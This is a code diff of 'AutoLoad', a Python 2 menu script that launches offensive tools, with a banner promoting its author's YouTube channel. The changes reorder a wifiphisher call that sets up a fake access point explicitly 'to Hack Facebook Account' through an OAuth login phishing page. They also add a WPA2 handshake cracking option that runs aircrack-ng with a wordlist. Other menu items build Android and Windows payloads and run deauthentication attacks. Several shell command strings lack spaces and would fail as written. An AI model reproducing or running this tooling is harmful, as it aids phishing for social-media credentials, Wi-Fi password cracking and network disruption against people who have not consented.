@@ -1,5 +1,6 @@
 #!/usr/bin/env python
 from __future__ import print_function
+from __future__ import absolute_import
 import colorama
 from colorama import Fore
 import os
@@ -9,6 +10,7 @@ import requests
 import httplib
 import socket
 import loading
+os.system('resize -s 19 92')
 os.system('clear')
 print(Fore.GREEN +"                        Welcome to                   |::::::Follow Me on::::::")
 print(Fore.GREEN +"         _         _        _     ___            _   |"+Fore.RED +"::::::::YouTube:::::::::") 
@@ -19,8 +21,8 @@ print(Fore.GREEN +"     /_/   \_\__,_|\__\___/|_____\___/ \__,_|\__,_|  |"+Fore.
 print(Fore.GREEN +"                Automatic Your Proccess              |"+Fore.WHITE +"http://facebook.com/majorhacke ")
 print(Fore.GREEN +"                       [created by Nafis] ["+Fore.WHITE +"V1.0"+Fore.GREEN +"]     |")
 print(Fore.GREEN +"====================================================================================")
-#----------------------------------------------------------------
-#----------------------------------------------------------------
+#------------------------------------------------------------------------------------------------------------------------------------------------------------
+#------------------------------------------------------------------------------------------------------------------------------------------------------------
 def check_internet():
     test_con="www.google.com"
     test_res="/intl/en/policies/privacy/"
@@ -38,7 +40,7 @@ def check_internet():
     else:
         print(Fore.GREEN +"Connected")
         
-#------------------------------------------------------------------
+#------------------------------------------------------------------------------------------------------------------------------------------------------------
 def android():
     os.system('clear')
     print("[*]::::::Create Payload For Android::::::")
@@ -55,7 +57,7 @@ def android():
     print("Done..")
     os.system('clear')
     import Autoload
-#-------------------------------------------------------------------
+#------------------------------------------------------------------------------------------------------------------------------------------------------------
 def windows():
     os.system('clear')
     print("[*]::::::Create Payload For Windows::::::")
@@ -73,7 +75,7 @@ def windows():
     print("Done..")
     os.system('clear')
     import Autoload
-#--------------------------------------------------------------------------------
+#------------------------------------------------------------------------------------------------------------------------------------------------------------
 def helppp():
     os.system('clear')
     print("")
@@ -87,18 +89,18 @@ def helppp():
     user_input=raw_input("Press Any key to Go back...")
     os.system('clear')
     import Autoload
-#--------------------------------------------------------------------------------------
+#------------------------------------------------------------------------------------------------------------------------------------------------------------
 def fakeap():
     os.system('clear')
     print("[*]::::::Create a Fake AP to Hack Facebook Account::::::")
     print("")
     ap=raw_input("[Enter the name of the AP:] > ")
-    os.system('xterm -e wifiphisher  --essid' +ap+ '-p oauth-login; exec bash')
     print("[]Creating............")
+    os.system('xterm -e wifiphisher  --essid' +ap+ '-p oauth-login; exec bash')
     print("Done..")
     os.system('clear')
     import Autoload
-#---------------------------------------------------------------------------------------
+#-------------------------------------------------------------------------------------------------------------------------------------------------------------
 def deauth():
     os.system('clear')
     def single():
@@ -141,7 +143,7 @@ def deauth():
         import Autoload
     else:
        print("Wrong Choice")
-#---------------------------------------------------------------------------------------------------
+#------------------------------------------------------------------------------------------------------------------------------------------------------------
 def geolocate():
     os.system('clear')
     check_internet()
@@ -156,7 +158,7 @@ def geolocate():
     user_input=raw_input("Press Any key to Go back...")
     os.system('clear')
     import Autoload
-#-----------------------------------------------------------------------------------------------------------    
+#------------------------------------------------------------------------------------------------------------------------------------------------------------    
 def check_ip():
     os.system('clear')
     check_internet()
@@ -166,60 +168,76 @@ def check_ip():
     print("")
     user_input=raw_input("Press Any key to Go back...")
     import Autoload
-#--------------------------------------------------------------------------------------------------------------
-#--------------------------------------------------------------------------------------------------------------        
+#------------------------------------------------------------------------------------------------------------------------------------------------------------
+def brute_force():
+    os.system('clear')
+    print("[*]::::::Cracking Wpa2 Handshake File using Dictinoary Attack::::::")
+    print("")
+    handsak=raw_input("[Select HandShake File:] > ")
+    print("")
+    wordlist=raw_input("[Select WordList File:] >")
+    crad=raw_input("[InterFace:] >")
+    os.system('clear')
+    print("[*]Cracking...........")
+    os.system('aircrack-ng' + handsak+ '-w' + wordlist +  crad)
+    print("")
+    userif = ''
+    while not(userif == 'B' or userif == 'E'):
+        userif=raw_input("Type [b] Back or [e] Exit").upper()
+        if userif == 'B':
+            import Autoload
+        elif userif == 'E':
+            sys.exit()
+        else:
+            print(Fore.RED +"Try Again")
+        
+    
+    
+#------------------------------------------------------------------------------------------------------------------------------------------------------------        
 print("")
-print("|1.)"+Fore.WHITE +" Make a Android Payload "+Fore.GREEN +"|5.)"+Fore.WHITE +" GeoLocate an IP "+Fore.GREEN +"|11.)"+Fore.WHITE +" Help")
-print(Fore.GREEN +"|2.)"+Fore.WHITE +" Make a Windows Payload "+Fore.GREEN +"|6.)"+Fore.WHITE +" View Public IP  "+Fore.GREEN +"|22.)"+Fore.WHITE +" Update")
-print(Fore.GREEN +"|3.)"+Fore.WHITE +" Create Fake AP         "+Fore.GREEN +"|                    "+Fore.GREEN +"|33.)"+Fore.WHITE +" Exit  ")
-print(Fore.GREEN +"|4.)"+Fore.WHITE +" Deauth Attack          "+Fore.GREEN +"|                    "+Fore.GREEN +"|      ")
+print("|1.)"+Fore.WHITE +" Make a Android Payload "+Fore.GREEN +"|5.)"+Fore.WHITE +" GeoLocate an IP "+Fore.GREEN +     "    |11.)"+Fore.WHITE +" Help")
+print(Fore.GREEN +"|2.)"+Fore.WHITE +" Make a Windows Payload "+Fore.GREEN +"|6.)"+Fore.WHITE +" View Public IP  "+Fore.GREEN + "    |22.)"+Fore.WHITE +" Update")
+print(Fore.GREEN +"|3.)"+Fore.WHITE +" Create Fake AP         "+Fore.GREEN +"|7.)"+Fore.WHITE +" Crack Wpa2 HandShake"+Fore.GREEN +"|33.)"+Fore.WHITE +" Exit  ")
+print(Fore.GREEN +"|4.)"+Fore.WHITE +" Deauth Attack          "+Fore.GREEN +"|                    "+Fore.GREEN +"    |      ")
 print("")
 while True:
-    user=input(Fore.BLUE +"[autoload] > ")
-    if user == 1:
-        android()
-    elif user == 2:
-        windows()
-    elif user == 11:
-        helppp()
-    elif user == 33:
+    try:
+        user=input(Fore.BLUE +"[autoload] > ")
+        if user == 1:
+            android()
+        elif user == 2:
+            windows()
+        elif user == 11:
+            helppp()
+        elif user == 33:
+            print("")
+            print(Fore.GREEN +"Thanks for using AutoLOad")
+            print("Goodbye!!")
+            print(Fore.RED +"Don't Forget to Subscribe my YouTube Channel..")
+            print("")
+            sys.exit()
+        elif user == 3:
+            fakeap()
+        elif user == 4:
+            deauth()
+        elif user == 5:
+            geolocate()
+        elif user == 6:
+            check_ip()
+        elif user == 7:
+            brute_force()
+        elif user == 22:
+            check_internet()
+            os.system('python updater.py')
+        elif user == 'clear':
+            os.system('clear')
+        else:
+            print(Fore.RED +"Wrong Choice")
+        continue
+    except KeyboardInterrupt:
         print("")
-        print("Thanks for using AutoLOad")
-        print("Goodbye!!")
-        print(Fore.RED +"Don't Forget to Subscribe my YouTube Channel..")
-        print("")
+        print(Fore.GREEN +"Thanks For Using AutoLoad!")
         sys.exit()
-    elif user == 3:
-        fakeap()
-    elif user == 4:
-        deauth()
-    elif user == 5:
-        geolocate()
-    elif user == 6:
-        check_ip()
-    elif user == 22:
-        check_internet()
-        os.system('python updater.py')
-    else:
-        print(Fore.RED +"Wrong Choice")
-
-print("")
-print("")
-print("")
-print ("You want to Continue....")
-print ("1.YES")
-print ("2.NO")
-while True:
-    user =input('Enter 1 or 2: ')
-    if user == 1:
-        import Autoload
-    elif user == 2:
-        print("Thanks for using AutoLOad")
-        print("Goodbye!!")
-        sys.exit()
-    else:
-        print (Fore.RED +"Wrong Choice")
-    continue
 
 
 
